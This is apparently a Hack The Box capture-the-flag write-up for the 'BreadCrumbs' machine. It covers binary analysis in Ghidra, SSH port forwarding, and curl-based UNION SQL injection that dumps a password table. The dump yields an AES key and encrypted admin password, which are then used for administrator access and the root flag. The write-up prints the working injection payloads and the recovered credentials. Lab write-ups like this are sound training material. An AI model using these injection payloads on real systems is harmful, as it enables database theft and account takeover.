# # `Enumeration` -

On further enumeration as a user development we found a binary -

```bash
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/15/2021   4:03 PM                Anouncements
d-----         1/15/2021   4:03 PM                Development
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---          2/1/2021   7:50 AM                Program Files
d-r---         12/7/2019   1:54 AM                Program Files (x86)
d-r---         1/17/2021   1:41 AM                Users
d-----          2/1/2021   1:10 AM                Windows


PS C:\> cd .\Development\
PS C:\Development> ls


    Directory: C:\Development


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/29/2020   3:11 AM          18312 Krypter_Linux
```

### Transferring to local machine -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# scp development@10.10.10.228:C:/Development/Krypter_Linux .
development@10.10.10.228's password: 
Krypter_Linux                                                                                                               100%   18KB  54.3KB/s   00:00 
```

### Enumerating the Binary -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

### Running the binary -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# ./Krypter_Linux 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>
```

### Giving arbitrary key -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# ./Krypter_Linux napster
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

Incorrect master key
```

### Ghidra -

Using Ghidra to see the main function -

```bash
undefined8 main(int param_1,long param_2)

{
  size_t sVar1;
  basic_ostream *this;
  ulong uVar2;
  basic_string local_58 [44];
  undefined4 local_2c;
  long local_28;
  int local_20;
  int local_1c;
  
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 00101263 to 001013cf has its CatchHandler @ 001013e5 */
  local_28 = curl_easy_init();
  puts(
      "Krypter V1.2\n\nNew project by Juliette.\nNew features added weekly!\nWhat to expect nextupdate:\n\t- Windows version with GUI support\n\t- Get password from cloud and AUTOMATICALLYdecrypt!\n***\n"
      );
  if (param_1 == 2) {
    local_1c = 0;
    local_20 = 0;
    while( true ) {
      uVar2 = SEXT48(local_20);
      sVar1 = strlen(*(char **)(param_2 + 8));
      if (sVar1 <= uVar2) break;
      local_1c = local_1c + *(char *)((long)local_20 + *(long *)(param_2 + 8));
      local_20 = local_20 + 1;
    }
    if (local_1c == 0x641) {
      if (local_28 != 0) {
        puts("Requesting decryption key from cloud...\nAccount: Administrator");
        curl_easy_setopt(local_28,0x2712,"http://passmanager.htb:1234/index.php");
        curl_easy_setopt(local_28,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(local_28,0x4e2b,WriteCallback);
        curl_easy_setopt(local_28,0x2711,local_58);
        local_2c = curl_easy_perform(local_28);
        curl_easy_cleanup(local_28);
        puts("Server response:\n\n");
        this = std::operator<<((basic_ostream *)std::cout,local_58);
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)this,
                   std::endl<char,std::char_traits<char>>);
      }
    }
    else {
      puts("Incorrect master key");
    }
  }
  else {
    puts("No key supplied.\nUSAGE:\n\nKrypter <key>");
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_58);
  return 0;
}
```

We can see some curl commands

Trying to use curl via ssh tunnel -

```bash
root@napster:/opt/ghidra_9.2.2_PUBLIC# ssh -L 1234:127.0.0.1:1234 development@10.10.10.228                                                                    
development@10.10.10.228's password:                                                                                                                          
Microsoft Windows [Version 10.0.19041.746]                                                                                                                    
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>
```

And adding the host to our host file /etc/hosts -

```bash
127.0.0.1       passmanager.htb
```

### Using curl to request the page we saw in Ghidra -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php
Bad Request
```

But if we supply the parameters too -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d 'method=select&username=administrator&table=passwords'
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

# # `Sql Injection` -

If we try to break the command we get a sql error -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator'&table=passwords"
select<br />
<b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php:18
Stack trace:
#0 C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php(18): mysqli_fetch_all(false, 1)
#1 {main}
  thrown in <b>C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php</b> on line <b>18</b><br />
```

### Trying to fix the error and union injection -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator' union select 'napster'-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(7) "napster"
  }
}
```

We can see "napster" in the result.

### Dumping Information -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator' union select schema_name from information_schema.schemata-- -&table=passwords"
selectarray(3) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(18) "information_schema"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(5) "bread"
  }
}
```

- We got two database.

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator' union select table_name from information_schema.tables where table_schema='bread'-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(9) "passwords"
  }
}
```

- One table passwords

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator' union select concat(table_name,':',column_name)from information_schema.columns where table_schema='bread'-- -&table=passwords"
selectarray(5) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(12) "passwords:id"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(17) "passwords:account"
  }
  [3]=>
  array(1) {
    ["aes_key"]=>
    string(18) "passwords:password"
  }
  [4]=>
  array(1) {
    ["aes_key"]=>
    string(17) "passwords:aes_key"
  }
}
```

```bash
root@napster:~/Documents/HTB/BreadCrumbs# curl passmanager.htb:1234/index.php -d "method=select&username=administrator' union select concat(account,':',aes_key,':',password)from bread.passwords-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(75) "Administrator:k19D193j.<19391(:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
  }
}
```

### Decrypting using Cyberchef -

![[Pasted image 20210729151820.png]]

Administrator - p@ssw0rd!@#$9890./


# # `Administrator` -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# ssh administrator@10.10.10.228
administrator@10.10.10.228's password:
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>administrator@BREADCRUMBS C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\Administrator

01/26/2021  10:06 AM    <DIR>          .
01/26/2021  10:06 AM    <DIR>          ..
01/15/2021  04:56 PM    <DIR>          3D Objects 
01/15/2021  04:56 PM    <DIR>          Contacts   
02/09/2021  08:08 AM    <DIR>          Desktop    
01/15/2021  04:56 PM    <DIR>          Documents  
01/15/2021  04:56 PM    <DIR>          Downloads  
01/15/2021  04:56 PM    <DIR>          Favorites  
01/15/2021  04:56 PM    <DIR>          Links      
01/15/2021  04:56 PM    <DIR>          Music      
01/15/2021  05:00 PM    <DIR>          OneDrive   
01/15/2021  04:57 PM    <DIR>          Pictures   
01/15/2021  04:56 PM    <DIR>          Saved Games
01/15/2021  04:57 PM    <DIR>          Searches   
01/15/2021  04:56 PM    <DIR>          Videos     
               0 File(s)              0 bytes     
              15 Dir(s)   6,364,852,224 bytes free

administrator@BREADCRUMBS C:\Users\Administrator>cd Desktop

administrator@BREADCRUMBS C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\Administrator\Desktop

02/09/2021  08:08 AM    <DIR>          .
02/09/2021  08:08 AM    <DIR>          ..
01/15/2021  05:03 PM    <DIR>          passwordManager
07/28/2021  10:38 PM                34 root.txt       
               1 File(s)             34 bytes
               3 Dir(s)   6,364,852,224 bytes free
administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt 
285356bd2161cdd3a463b9b37ba61675
```